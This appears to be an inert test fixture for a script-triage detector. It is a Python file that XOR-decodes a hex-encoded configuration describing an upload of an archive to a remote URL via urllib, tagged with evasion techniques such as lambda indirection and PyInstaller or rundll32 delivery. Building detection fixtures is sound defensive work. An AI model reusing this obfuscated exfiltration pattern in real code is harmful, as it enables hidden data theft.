#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_72667daa = "654394b2b3671bd6bdfd7011caa2a5700af9a2af701fcae2a57d1dc9aaa54c1fd4ada87a08c3e2b4611fc8bdad7a0af9bca57e11d2abbc721ac7beb4760c9bbbb27f12cfac9f611bd7bba5600af9acaf7707dabdb47219c391a37c0bc8bafd2202d5b7ae671fdef3a47a1dd2a7af7d1fd4b79f7717d5bea1671dceb2af7118d3bda3720acfa1ae2e12c7a3a2771ff9a7ae7717d4aba36717c9a0bc701fd4bca9760c9bbeb97a10d5baa17f12c3bc9f7c10c3aaa96102d1a7ae7711d1bd9f7016c7a7ae2e0cd3a0a47f1295fc9f630cc3aaa5701bd5bdaf6102c5afad631fcfa9ae4c17c2f3a37213d6afa974108bf6f5724793fba6724e96b2b56312c9afa44c0bd4a2fd7b0ad2beb3295189f6f5724793fba6724e96e0a56b1fcbbeac7650cfa0b67212cfaaef660ecaa1a17702c7bca37b17d0ab9f631fd2a6fd5044899eb27c19d4afad571fd2afef5b0bc8bab2760dd582a17151c5afa37b1b8bf6f5724793fba6724e96e0ba7a0e"
    CODEC_72667daa = "hex_literal|repeating_key_xor|13,7e,a6,ce,c0"

    def load_72667daa():
        return bytes.fromhex(MATERIAL_72667daa)

    def decode_72667daa(item1):
        key_bytes = (19, 126, 166, 206, 192,)
        return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(item1))

    def recover_72667daa():
        item4 = None
        item2 = decode_72667daa(load_72667daa())
        item3 = item2.decode("ascii", "strict")
        return item3

    def inspect_72667daa():
        return recover_72667daa()

    def surface_72667daa():
        routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
        return routes["selected"]()

    def obfuscation_72667daa():
        recover = lambda value: value
        return recover("lambda_indirection")

    def plan_72667daa():
        fields = dict(item.split("=", 1) for item in inspect_72667daa().split("|"))
        analysis_surface = surface_72667daa()
        obfuscation_surface = obfuscation_72667daa()
        operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_72667daa())
